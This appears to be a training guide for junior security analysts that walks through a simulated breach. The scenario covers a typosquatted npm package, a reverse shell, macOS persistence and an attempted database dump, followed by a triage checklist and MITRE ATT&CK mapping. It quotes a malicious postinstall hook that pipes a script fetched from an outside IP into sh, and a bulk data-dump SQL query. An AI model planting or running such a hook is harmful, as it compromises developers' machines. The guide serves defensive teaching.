# KVCH Security Intelligence Report: Cyber Intern & Junior Analyst
**Document Reference**: `KVCH-INTERN-2026-8891`  
**Target Role**: Junior Security Analyst / SOC Trainee / Guided Incident Responder  
**Classification**: Internal Training & Incident Triage Guide  
**Incident Reference**: `#INC-2026-8891`  
**Severity**: **CRITICAL** (Triage Priority: P1)  
**Simulation Window**: 120-Minute Sandbox Attack Run  
**Assigned Asset**: `MacBook-Pro-Dev03.lan` (`192.168.31.204`)  

---

## 1. Educational Incident Overview
This report provides a step-by-step incident response walkthrough of the 120-minute sandbox breach simulation. As a Junior SOC Analyst, your goal is to understand how modern multi-stage cyber attacks unfold, learn how each of the 10 KVCH modular extensions detects specific malicious behaviors, and follow a standardized checklist to verify Indicators of Compromise (IOCs) before escalating to Senior Leads.

```
[Phase 1: Recon]     ──> [Phase 2: Supply Chain] ──> [Phase 3: C2 & Persistence] ──> [Phase 4: Exfil Halt]
(Ports 5432 & 445 Open)  (@crypto-utils@1.4.2)        (PID 14209 Reverse Shell)       (AegisDB Blocks Dump)
```

---

## 2. Five Core Cyber Security Concepts Explained

### 1. Attack Surface Reconnaissance
- **What Happened**: The attacker scanned the network using `nmap`/`zmap` and found port `5432` (PostgreSQL) and port `445` (SMB) listening on `0.0.0.0`.
- **Why It Matters**: When a software service listens on `0.0.0.0`, it accepts incoming connections from any computer on the local network or internet. Local development databases must always bind strictly to `127.0.0.1` (localhost).

### 2. Supply Chain Poisoning & Typosquatting
- **What Happened**: The attacker published `@kvch-internal/crypto-utils@1.4.2` to the public registry. This package mimics our internal package `@kvch/crypto-utils`. Inside `package.json`, they added a `postinstall` script:
  ```bash
  curl -sL http://185.220.101.5/stage2.sh | sh
  ```
- **Why It Matters**: Whenever an engineer runs `npm install`, npm automatically executes `postinstall` scripts with full user privileges, allowing malicious code to run without needing to be imported by application code.

### 3. Shannon Entropy Analysis ($H > 7.2$)
- **What Happened**: The `malware-analyzer` engine computed the Shannon entropy of `/tmp/.system_daemon` and recorded $H = 7.942$.
- **Why It Matters**: Standard executable code has an entropy between $4.5$ and $6.0$. Entropy measures randomness. A score above $7.2$ indicates that the file has been compressed, packed, or encrypted to hide its true instructions from static antivirus scanners.

### 4. Reverse TCP Shells
- **What Happened**: The dropped binary spawned process PID 14209, connecting outward to `185.220.101.5:443`.
- **Why It Matters**: Corporate firewalls typically block incoming connections from the internet. Attackers bypass this by having the compromised computer initiate an *outbound* connection to the attacker's server over port 443 (which usually carries HTTPS web traffic).

### 5. Zero-Trust AST Database Protection
- **What Happened**: The attacker attempted to run:
  ```sql
  SELECT * FROM users, employee_salaries, api_keys;
  ```
- **Why It Matters**: AegisDB parses database queries into Abstract Syntax Trees (ASTs). When it sees an unpaginated query attempting to dump sensitive tables without `LIMIT` or `WHERE` filters, it recognizes a data theft pattern and forcibly terminates the socket connection within milliseconds.

---

## 3. Junior Analyst Step-by-Step Triage Checklist

Follow these exact steps in your sandbox terminal to verify the incident:

- [ ] **Step 1: Verify Open Ports**
  ```bash
  # Check if port 5432 is bound to 0.0.0.0 (Unsafe) or 127.0.0.1 (Safe)
  netstat -tulpn | grep 5432
  ```
- [ ] **Step 2: Inspect Suspicious Process Lineage**
  ```bash
  # Check PID 14209 command-line arguments and parent process
  ps aux | grep 14209
  ```
- [ ] **Step 3: Calculate Payload Entropy**
  ```bash
  # Run entropy calculation script on the dropped file
  python3 -c "import math; data=open('/tmp/.system_daemon','rb').read(); ent=sum(-p*math.log2(p) for p in [data.count(b)/len(data) for b in set(data)] if p>0); print('Entropy:', ent)"
  ```
- [ ] **Step 4: Check Persistence Plists**
  ```bash
  # Look for newly created LaunchAgents in the user directory
  ls -la ~/Library/LaunchAgents/
  ```
- [ ] **Step 5: Inspect Database Firewalls Logs**
  ```bash
  # Check AegisDB logs for severed socket events
  tail -n 20 /var/log/kvch/aegisdb_audit.log
  ```

---

## 4. MITRE ATT&CK Mapping Reference

| MITRE Technique | Technique Name | Detection Extension | Junior Analyst Observation |
| :--- | :--- | :--- | :--- |
| **T1190** | Exploit Public-Facing Application | `attack-surface-scanner` | Unrestricted socket listening on `0.0.0.0:5432` |
| **T1195.001** | Compromise Software Dependencies | `supply-chain-auditor` | Typosquatted npm package with `postinstall` hook |
| **T1059.001** | Command & Scripting Interpreter: JS | `threat-hunter-3000` | Node.js child process executing `/bin/sh` |
| **T1071.001** | Web Protocols (C2) | `threat-hunter-3000` | Outbound TCP connection to `185.220.101.5:443` |
| **T1543.001** | LaunchAgent Persistence | `threat-hunter-3000` | Plist configured to run on login |
| **T1005** | Data from Local System | `credential-exposure-auditor` | Scraping plaintext `.env` keys |
| **T1048** | Exfiltration Over Alternative Protocol | `aegisdb-zerotrust` | Mass unpaginated SQL query terminated |

---

## 5. Escalation Protocol
1. **Document**: Record timestamp, PID (14209), C2 IP (`185.220.101.5`), and SHA-256 hash in internal ticket.
2. **Quarantine**: Trigger the automated SOAR playbook (`ACT-01-KILL-QUARANTINE`).
3. **Escalate**: Notify Senior Developer on-call and HR Compliance officer with completed checklist.
